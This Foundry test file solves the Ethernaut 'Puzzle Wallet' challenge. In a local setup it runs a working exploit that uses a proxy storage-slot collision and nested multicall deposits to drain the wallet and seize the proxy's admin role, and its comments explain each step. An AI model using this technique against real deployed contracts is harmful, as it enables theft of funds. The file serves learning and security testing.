// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test, console2} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "src/Week17-18/EthernautPuzzleWallet.sol";

//forge test --mc EthernautPuzzleWalletTest -vvvv
contract EthernautPuzzleWalletTest is Test {
    address owner;
    address attacker;

    PuzzleProxy puzzleProxy;
    PuzzleWallet puzzleWallet;

    PuzzleWallet walletInstance;

    function setUp() public {
        owner = address(this);
        attacker = address(0xbad);

        vm.deal(owner, 1 ether);
        vm.deal(attacker, 1 ether);

        puzzleWallet = new PuzzleWallet();

        //This calls `init` in `PuzzleWallet` with 100 ether as the argument
        //Which sets `maxBalance` to 100 ether.
        bytes memory initData = abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);

        puzzleProxy = new PuzzleProxy(owner, address(puzzleWallet), initData);
        walletInstance = PuzzleWallet(address(puzzleProxy));

        walletInstance.addToWhitelist(owner);
        walletInstance.deposit{value: 0.1 ether}();
    }

    function testExploit() public {
        vm.startPrank(attacker);

        puzzleProxy.proposeNewAdmin(attacker);

        walletInstance.addToWhitelist(attacker);

        //This is the function (deposit) to call in multicall
        bytes[] memory firstDepositCallEncoded = new bytes[](1);
        firstDepositCallEncoded[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        //This is the next function (multicall with `deposit` call encoded as bytes as the argument) to call in multicall
        bytes[] memory dataForMulticallEncoded = new bytes[](2);
        dataForMulticallEncoded[0] = firstDepositCallEncoded[0];
        dataForMulticallEncoded[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, firstDepositCallEncoded);

        //Send with only 0.1 ether, but will be counted twice in the contract
        walletInstance.multicall{value: 0.1 ether}(dataForMulticallEncoded);

        //Drain the contract
        walletInstance.execute(attacker, 0.2 ether, "");

        walletInstance.setMaxBalance(uint256(uint160(attacker)));

        assertEq(puzzleProxy.admin(), attacker);
    }
}

//Exploit:
// In the storage layout across the two contracts, `pendingAdmin` in `PuzzleProxy` is in same slot as
// `owner` in `PuzzleWallet`. And `admin` in `PuzzleProxy` is in the same slot as `maxBalance` in `PuzzleWallet`.
//
// First call `proposeNewAdmin` with attacker address, so that owner of `PuzzleProxy` is set to attacker.
// Then call `addToWhiteList` to whitelist the attacker address so that we can call `setMaxBalance`, `deposit`,
// `execute` and `multicall` functions in `PuzzleWallet`.
//
// In order to call `setMaxBalance`, we need to have the contract balance to be 0. The contract starts with 0.1 ether,
// but this is not our balance. So we need to trick the contract into thinking we have more than what we actually have.
// We do this through the multicall:
//    multicall -> deposit 0.1 ether -> multicall -> deposit 0.1 ether.
// Or in other words:
//    multicall(deposit) -> multicall(deposit).
//
// We have to do this because of the checks in `multicall` ==> cannot call deposit more than once, but we can call
// `multicall` again with a new `deposit` call. This also allows us to deposit 0.2 ether into our balance when we 
// only paid 0.1 ether. Because of how msg.value is used in `deposit`, 0.1 ether will be counted more than once.
// Recall that in `delegatecall`, the context, which includes msg.value, is preserved, thus it repeats its value.
// The contract will have 0.2 ether in its balance, and our balance will also be 0.2 ether. Now we call `execute` 
// to drain the contract. And we can finally change the `admin` of `PuzzleProxy` to the attacker by calling
// `setMaxBalance` with the attacker's address.